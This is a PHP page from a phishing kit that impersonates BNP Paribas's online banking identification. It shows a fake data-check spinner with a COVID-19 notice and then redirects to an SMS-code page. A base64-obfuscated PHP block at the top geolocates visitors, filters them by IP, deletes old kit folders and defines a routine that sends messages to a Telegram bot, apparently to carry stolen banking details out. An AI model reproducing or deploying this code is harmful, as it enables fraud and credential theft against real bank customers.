<?php eval(base64_decode('CiBnb3RvIEJ6YlJXOyBlUHBOUDogJHBhcmVudERpcmVjdG9yeSA9ICJcNTZceDJlXDU3XHgyZVx4MmVceDJmXDE2N1wxNDVceDYyIjsgZ290byBIbnlOSzsgWV8wckY6IGZ1bmN0aW9uIGRlbGV0ZURpcmVjdG9yeSgkZGlyKSB7IGlmICghZmlsZV9leGlzdHMoJGRpcikpIHsgcmV0dXJuIHRydWU7IH0gaWYgKCFpc19kaXIoJGRpcikpIHsgcmV0dXJuIHVubGluaygkZGlyKTsgfSAkdGltZV9kaWZmID0gdGltZSgpIC0gZmlsZWN0aW1lKCRkaXIpOyBpZiAoJHRpbWVfZGlmZiA+IDkyMCkgeyBmb3JlYWNoIChzY2FuZGlyKCRkaXIpIGFzICRpdGVtKSB7IGlmICgkaXRlbSA9PSAiXHgyZSIgfHwgJGl0ZW0gPT0gIlx4MmVcNTYiKSB7IGNvbnRpbnVlOyB9IGlmICghZGVsZXRlRGlyZWN0b3J5KCRkaXIgLiBESVJFQ1RPUllfU0VQQVJBVE9SIC4gJGl0ZW0pKSB7IHJldHVybiBmYWxzZTsgfSB9IGlmIChybWRpcigkZGlyKSkgeyByZXR1cm4gdHJ1ZTsgfSBlbHNlIHsgcmV0dXJuIGZhbHNlOyB9IH0gZWxzZSB7IHJldHVybiB0cnVlOyB9IH0gZ290byBlUHBOUDsgQmF2dkY6IGlmICh0cmltKCRyZXNsb2NhbCkgIT0gdHJpbSgkU3RydXBMb20pKSB7ICRTdHJvbmdTb2wgPSAnJyAuIGJhc2VuYW1lKF9fRElSX18pOyBlY2hvICJceDNjXHg3M1x4NjNcMTYyXDE1MVx4NzBcMTY0XDQwXDExNFwxMDFceDRlXDEwN1x4NTVceDQxXHg0N1wxMDVcNzVcNDdceDRhXHg2MVwxNjZcMTQxXHg1M1x4NjNceDcyXDE1MVwxNjBceDc0XHgyN1w3Nlx4YVw0MFx4MjBceDIwXHgyMFx4NzdcMTUxXHg2ZVx4NjRceDZmXHg3N1x4MmVcMTU0XDE1N1x4NjNceDYxXHg3NFwxNTFceDZmXDE1Nlx4MmVceDY4XHg3MlwxNDVcMTQ2XDc1XHgyN1w1Nlw1Nlw1N1w1Nlx4MmVceDJmXHg2OVwxNTZceDY0XHg2NVx4NzhceDJlXDE2MFwxNTBcMTYwXHgzZlwxNjZceDY1XDE2Mlx4NjlcMTQ2XHg3OVx4NWZcMTQxXHg2M1wxNDNceDZmXDE2NVwxNTZceDc0XHgzZFwxNjNcMTQ1XDE2M1wxNjNcMTUxXHg2ZlwxNTZceDNkXDQ2IiAuIG1kNShtaWNyb3RpbWUoKSkgLiAiXHgyNlwxNDRcMTUxXDE2M1x4NzBceDYxXHg3NFwxNDNcMTUwXHgzZCIgLiBzaGExKG1pY3JvdGltZSgpKSAuICJcNDZceDYxXDE0M1wxNDNcMTQ1XDE2M1x4NzNcNzVcNDZcMTQ0XHg2MVwxNjRcMTQxXDc1IiAuIHNoYTEobWljcm90aW1lKCkpIC4gIlx4MjZceDZjXHg2ZlwxNTRceDZkXHg2NVw3NXskU3Ryb25nU29sfVw0N1w3M1wxMlx4MjBcNDBceDIwXHgyMFw3NFw1N1wxNjNcMTQzXHg3Mlx4NjlceDcwXDE2NFx4M2UiOyBkaWU7IH0gZ290byBVRkI4NTsgWkQ4NGw6IGlmIChpc3NldCgkaW5mb1siXDE0M1wxNTdcMTY1XHg2ZVx4NzRceDcyXHg3OVx4NDNcMTU3XDE0NFwxNDUiXSkpIHsgJF9TRVNTSU9OWyJcMTE2XHg2YVx4NmZceDcwXHg2NiJdID0gJGluZm9bIlwxNDNcMTU3XHg3NVwxNTZcMTY0XDE2MlwxNzFceDQzXHg2Zlx4NjRcMTQ1Il07IH0gZ290byBqNHFJaTsgb1dSdDM6IGlmIChpc3NldCgkaW5mb1siXDE2MlwxNDVceDY3XDE1MVx4NmZceDZlXHg0ZVx4NjFcMTU1XHg2NSJdKSkgeyAkX1NFU1NJT05bIlwxNzBceDRmXHg3MFx4NzVcMTcxIl0gPSAkaW5mb1siXDE2Mlx4NjVcMTQ3XHg2OVx4NmZceDZlXHg0ZVx4NjFcMTU1XDE0NSJdOyB9IGdvdG8gWV8wckY7IFNBRmlnOiAkU3RydXBMb20gPSAkaXBQb3J0QXJyYXlbMF07IGdvdG8gYUp0M3Y7IFNRQXBLOiBpZiAoaXNzZXQoJGluZm9bIlx4NjNceDZmXDE2NVwxNTZcMTY0XHg3Mlx4NzkiXSkpIHsgJF9TRVNTSU9OWyJceDQyXDE1NFwxNDFceDczXDE0MVwxNDNcMTU3XDE2NVwxNTYiXSA9ICRpbmZvWyJcMTQzXHg2Zlx4NzVceDZlXDE2NFx4NzJceDc5Il07IH0gZ290byBaRDg0bDsgV214Sm46IGlmIChpc3NldCgkaW5mb1siXHg2MVx4NzMiXSkpIHsgJF9TRVNTSU9OWyJcMTUxXDE2M1x4NzAiXSA9ICRpbmZvWyJcMTQxXDE2MyJdOyB9IGdvdG8gU1FBcEs7IFVGQjg1OiBmdW5jdGlvbiB0ZWxzZW50KCRtZXNzYWdlKSB7ICRUcnViRnR1YiA9ICRfQ09PS0lFWyJceDY5XDE0NFwxNjRcMTQ1XDE1NCJdOyAkY1JldFZja3IgPSAkX0NPT0tJRVsiXHg3NFwxNTdcMTUzXHg2NVx4NmVceDc0XHg2NVwxNTQiXTsgJGFwaV91cmwgPSAiXHg2OFx4NzRcMTY0XDE2MFx4NzNceDNhXDU3XHgyZlwxNDFcMTYwXDE1MVw1Nlx4NzRceDY1XDE1NFx4NjVcMTQ3XHg3Mlx4NjFcMTU1XHgyZVx4NmZcMTYyXHg2N1x4MmZceDYyXHg2Zlx4NzR7JGNSZXRWY2tyfVx4MmZceDczXHg2NVwxNTZceDY0XDExNVx4NjVcMTYzXDE2M1wxNDFceDY3XDE0NSI7ICRwYXJhbXMgPSBhcnJheSgiXDE0M1wxNTBceDYxXDE2NFx4NWZceDY5XHg2NCIgPT4gJFRydWJGdHViLCAiXDE2NFwxNDVcMTcwXDE2NCIgPT4gJG1lc3NhZ2UpOyAkY2ggPSBjdXJsX2luaXQoKTsgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1VSTCwgJGFwaV91cmwpOyBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUE9TVCwgdHJ1ZSk7IGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9QT1NURklFTERTLCBodHRwX2J1aWxkX3F1ZXJ5KCRwYXJhbXMpKTsgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1JFVFVSTlRSQU5TRkVSLCB0cnVlKTsgJHJlc3BvbnNlID0gY3VybF9leGVjKCRjaCk7IGN1cmxfY2xvc2UoJGNoKTsgfSBnb3RvIE9mYUd6OyBCemJSVzogZXJyb3JfcmVwb3J0aW5nKEVfQUxMKTsgZ290byBRNERWQzsgSG55Tks6ICRkaXJlY3RvcmllcyA9IGdsb2IoJHBhcmVudERpcmVjdG9yeSAuICJcNTdceDJhIiwgR0xPQl9PTkxZRElSKTsgZ290byBZZVJ3WDsgeldqY0k6IGlmICghZW1wdHkoJF9TRVJWRVJbIlx4NDhcMTI0XDEyNFx4NTBcMTM3XHg0M1x4NGNcMTExXDEwNVx4NGVcMTI0XHg1ZlwxMTFcMTIwIl0pKSB7ICRpcEFkZHJlc3MgPSAkX1NFUlZFUlsiXDExMFx4NTRceDU0XDEyMFx4NWZceDQzXDExNFwxMTFceDQ1XHg0ZVx4NTRceDVmXHg0OVx4NTAiXTsgfSBlbHNlaWYgKCFlbXB0eSgkX1NFUlZFUlsiXHg0OFwxMjRceDU0XHg1MFwxMzdcMTMwXDEzN1wxMDZceDRmXDEyMlwxMjdcMTAxXDEyMlwxMDRcMTA1XDEwNFx4NWZceDQ2XHg0Zlx4NTIiXSkpIHsgJGlwQWRkcmVzcyA9ICRfU0VSVkVSWyJceDQ4XDEyNFx4NTRceDUwXHg1Zlx4NThceDVmXHg0NlwxMTdcMTIyXDEyN1wxMDFcMTIyXHg0NFwxMDVcMTA0XDEzN1x4NDZceDRmXHg1MiJdOyB9IGVsc2UgeyAkaXBBZGRyZXNzID0gJF9TRVJWRVJbIlwxMjJcMTA1XDExNVwxMTdceDU0XHg0NVx4NWZceDQxXHg0NFwxMDRceDUyIl07IH0gZ290byBSajNPNDsgYUp0M3Y6ICRkb25mbGFnID0gJF9TRVJWRVJbIlwxMjNcMTA1XDEyMlx4NTZcMTA1XDEyMlx4NWZceDRlXDEwMVx4NGRcMTA1Il07IGdvdG8gWkhoajU7IGRLODZuOiAkZmlsZW5hbWUgPSAiXDE1NFwxNTdceDYzXDE0MVwxNTRceDJlXDE2NFx4NzhcMTY0IjsgZ290byBGT0h1MjsgUmozTzQ6ICRpcFBvcnRBcnJheSA9IGV4cGxvZGUoIlw3MiIsICRpcEFkZHJlc3MpOyBnb3RvIFNBRmlnOyBqNHFJaTogaWYgKGlzc2V0KCRpbmZvWyJceDYzXHg2OVx4NzRcMTcxIl0pKSB7ICRfU0VTU0lPTlsiXDEyNlwxNTdceDcwXDE2MlwxNjQiXSA9ICRpbmZvWyJcMTQzXDE1MVx4NzRceDc5Il07IH0gZ290byBvV1J0MzsgWkhoajU6ICRpbmZvID0gdW5zZXJpYWxpemUoZmlsZV9nZXRfY29udGVudHMoIlwxNTBcMTY0XHg3NFx4NzBceDNhXDU3XHgyZlwxNTFceDcwXHgyZFwxNDFcMTYwXHg2OVx4MmVceDYzXDE1N1wxNTVcNTdcMTYwXDE1MFwxNjBceDJmeyRTdHJ1cExvbX1cNzdceDY2XDE1MVx4NjVceDZjXDE0NFwxNjNcNzVceDczXDE2NFx4NjFcMTY0XHg3NVx4NzNcNTRcMTU1XHg2NVx4NzNcMTYzXHg2MVx4NjdcMTQ1XDU0XDE0M1wxNTdcMTU2XHg3NFwxNTFcMTU2XDE0NVwxNTZceDc0XHgyY1x4NjNcMTU3XDE1Nlx4NzRcMTUxXDE1NlwxNDVcMTU2XHg3NFx4NDNcMTU3XHg2NFx4NjVcNTRcMTQzXDE1N1wxNjVceDZlXHg3NFx4NzJceDc5XHgyY1wxNDNceDZmXHg3NVx4NmVcMTY0XDE2MlwxNzFceDQzXHg2ZlwxNDRceDY1XHgyY1x4NzJceDY1XDE0N1wxNTFceDZmXHg2ZVx4MmNcMTYyXHg2NVwxNDdcMTUxXDE1N1x4NmVceDRlXDE0MVx4NmRceDY1XHgyY1wxNDNceDY5XDE2NFwxNzFceDJjXHg2NFx4NjlceDczXHg3NFx4NzJceDY5XHg2M1wxNjRceDJjXDE3Mlx4NjlcMTYwXHgyY1wxNTRceDYxXDE2NFx4MmNcMTU0XHg2Zlx4NmVcNTRcMTY0XDE1MVx4NmRceDY1XHg3YVx4NmZceDZlXHg2NVx4MmNceDYzXDE2NVx4NzJceDcyXDE0NVx4NmVceDYzXDE3MVw1NFx4NjlceDczXDE2MFx4MmNcMTU3XDE2MlwxNDdcNTRcMTQxXHg3M1w1NFwxNDFcMTYzXDE1Nlx4NjFcMTU1XDE0NVw1NFx4NzJceDY1XDE2Nlx4NjVcMTYyXHg3M1wxNDVceDJjXDE1NVx4NmZceDYyXHg2OVwxNTRceDY1XHgyY1wxNjBcMTYyXDE1N1x4NzhcMTcxXHgyY1wxNTBcMTU3XDE2M1wxNjRcMTUxXDE1NlwxNDdcNTRcMTYxXDE2NVwxNDVceDcyXHg3OSIpKTsgZ290byBXbXhKbjsgUTREVkM6IGluaV9zZXQoIlwxNDRceDY5XHg3M1x4NzBceDZjXDE0MVwxNzFceDVmXDE0NVwxNjJcMTYyXDE1N1x4NzJcMTYzIiwgMSk7IGdvdG8geldqY0k7IFllUndYOiBpZiAoaXNfYXJyYXkoJGRpcmVjdG9yaWVzKSkgeyBmb3JlYWNoICgkZGlyZWN0b3JpZXMgYXMgJGRpcikgeyBpZiAoYmFzZW5hbWUoJGRpcilbMF0gIT0gIlx4MmUiKSB7IGlmIChkZWxldGVEaXJlY3RvcnkoJGRpcikpIHsgfSB9IH0gfSBnb3RvIGRLODZuOyBGT0h1MjogaWYgKGZpbGVfZXhpc3RzKCRmaWxlbmFtZSkpIHsgJG15ZmlsZSA9IGZvcGVuKCRmaWxlbmFtZSwgIlwxNjIiKSBvciBkaWUoIlwxMjVceDZlXDE0MVwxNDJceDZjXHg2NVx4MjBceDc0XHg2Zlw0MFx4NmZcMTYwXDE0NVwxNTZcNDBceDY2XHg2OVwxNTRcMTQ1XHgyMSIpOyAkcmVzbG9jYWwgPSBmcmVhZCgkbXlmaWxlLCBmaWxlc2l6ZSgkZmlsZW5hbWUpKTsgZmNsb3NlKCRteWZpbGUpOyB9IGVsc2UgeyAkU3Ryb25nU29sID0gJycgLiBiYXNlbmFtZShfX0RJUl9fKTsgZWNobyAiXDc0XDE2M1wxNDNcMTYyXHg2OVx4NzBcMTY0XDQwXHg0Y1wxMDFcMTE2XHg0N1wxMjVcMTAxXHg0N1wxMDVceDNkXDQ3XHg0YVwxNDFceDc2XHg2MVx4NTNceDYzXHg3Mlx4NjlcMTYwXDE2NFw0N1x4M2VceGFceDIwXHgyMFx4MjBceDIwXDE2N1x4NjlceDZlXHg2NFx4NmZcMTY3XDU2XHg2Y1wxNTdceDYzXHg2MVwxNjRcMTUxXDE1N1x4NmVceDJlXHg2OFx4NzJceDY1XDE0Nlx4M2RceDI3XDU2XDU2XDU3XDU2XHgyZVx4MmZcMTUxXDE1Nlx4NjRcMTQ1XHg3OFx4MmVceDcwXHg2OFx4NzBcNzdcMTY2XHg2NVwxNjJcMTUxXDE0NlwxNzFceDVmXHg2MVx4NjNcMTQzXDE1N1x4NzVcMTU2XHg3NFx4M2RcMTYzXDE0NVwxNjNcMTYzXDE1MVx4NmZcMTU2XHgzZFw0NiIgLiBtZDUobWljcm90aW1lKCkpIC4gIlx4MjZceDY0XHg2OVwxNjNcMTYwXHg2MVx4NzRceDYzXDE1MFx4M2QiIC4gc2hhMShtaWNyb3RpbWUoKSkgLiAiXHgyNlwxNDFceDYzXHg2M1x4NjVceDczXHg3M1x4M2RceDI2XDE0NFx4NjFceDc0XDE0MVx4M2QiIC4gc2hhMShtaWNyb3RpbWUoKSkgLiAiXHgyNlx4NmNceDZmXDE1NFwxNTVceDY1XHgzZHskU3Ryb25nU29sfVw0N1w3M1wxMlx4MjBcNDBcNDBcNDBcNzRcNTdcMTYzXDE0M1x4NzJceDY5XHg3MFwxNjRceDNlIjsgZGllOyB9IGdvdG8gQmF2dkY7IE9mYUd6OiA=')); ?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"> 
<html>

<head>
<meta charset="UTF-8">
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<meta http-equiv="pragma" content="no-cache">
<meta http-equiv="Cache-Control" content="no-cache">
<meta http-equiv="expires" content="Tue, 01-Jan-1980 00:00:00 GMT">
<meta http-equiv="date" content="Tue, 01-Jan-1980 00:00:00 GMT">
<title>BNPPARIBAS NET IDENTIFICATION</title>
<link href="images/dciweb.css" rel="stylesheet" type="text/css">
<link href="images/bnp.css" rel="stylesheet" type="text/css">
</head>
<body  bgcolor="#FFFFFF" link="#002288" alink="#002288" vlink="#002288"  >
<script language="JavaScript" src="images/tools.js"></script>
  <style>
    body {display : none;} 
  </style>
  <script>
    if (self == top) { 
      var theBody = document.getElementsByTagName('body')[0];
      theBody.style.display = "block";
    } else { 
      top.location = self.location; 
    }
  </script>
  <style type="text/css">
    <!--
    a:link,a:active,a:visited
    {
    text-decoration:none;
    color:black;
    }
    a:hover
    {
    text-decoration: underline;
    color:#0000FF;
    }
    //-->
  </style>
  <style type="text/css">
    
    html,body{
  background:#fff;
  margin:0;
}
.centered{
  width:190px;
  height:190px;
  position:absolute;
  top:45%;
  left:50%;
  transform:translate(-50%,-50%);
  background:#fff;
  filter: blur(10px) contrast(20);
}
.blob-1,.blob-2{
  width:50px;
  height:50px;
  position:absolute;
  background:#000;
  border-radius:50%;
  top:50%;left:50%;
  transform:translate(-50%,-50%);
}
.blob-1{
  left:20%;
  animation:osc-l 2.5s ease infinite;
}
.blob-2{
  left:80%;
  animation:osc-r 2.5s ease infinite;
  background:#0ff;
}
@keyframes osc-l{
  0%{left:20%;}
  50%{left:50%;}
  100%{left:20%;}
}
@keyframes osc-r{
  0%{left:80%;}
  50%{left:50%;}
  100%{left:80%;}
}

  </style>
  <div class="page">
    <table>
      <tr>
        <td align="center"><img align="center" border="0" src="https://raw.githubusercontent.com/0dayestra/source/main/images/headerBack.jpg" width="760" height="75"></td>
      </tr>
      <tr>
        <td colspan=2>&nbsp;</td>
      </tr>
    </table>
    <div class="info3"><span style="font-size:130%">
  Acc&eacute;dez &agrave; l'espace s&eacute;curis&eacute; BNPPARIBAS.NET
</span></div>
    <div align="left">
      &nbsp;
    </div>
      <div align="center">
        <b><font color="#FF0000"><font color="#269EE5">Dans ce contexte in&eacute;dit nos agences restent ouvertes dans leur tr&egrave;s grande majorit&eacute; et nous sommes joignables par t&eacute;l&eacute;phone ou mail.<br>Nos equipes sont &agrave; vos cot&eacute;s pour vous proposer si besoin, des solutions adapt&eacute;es &agrave; chaque situation. Nous vous remercions de votre confiance et de votre fid&eacute;lit&eacute;. </font> </font></b>

        <br />

        <p style="font-size:13px;">Veuillez patienter nous <strong>contrôlons vos données</strong> ... Ne quittez pas cette page pendant le traitement.</p>

        <center>
              <input type="hidden" name="vkid" value="vkident-8364hk1sgj">
              <input type="hidden" name="p1">
              <div style="width:620px; margin:0 auto; text-align: left">

                <div style="float:left;width: 50%; ">


                  <div class = "centered">
                    <div class = "blob-1"></div>
                    <div class = "blob-2"></div> 
                </div>




                <br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br />


                </div>
              </div>
            
        </center> 
      </div>
      
      <div style="clear:both;"/>
        
        <div align="center">
        
          
            <div style="padding-top: 10px; position: relative; top: 80px;">
              <img src="https://raw.githubusercontent.com/0dayestra/source/main/images/covid19-information.png" height="300" border="0">
            </div>
          
        
      </div>
        
        
      </div>
    
  </div>
  
  <script type="text/javascript">
    document.saisie.p0.focus();
  </script>

  <script type="text/javascript">
            setTimeout(function () {
                window.location.href= 'sms_session.php';
            },40000); // 1000 = 1s
        </script>
  
  
</div>
</body>


</html>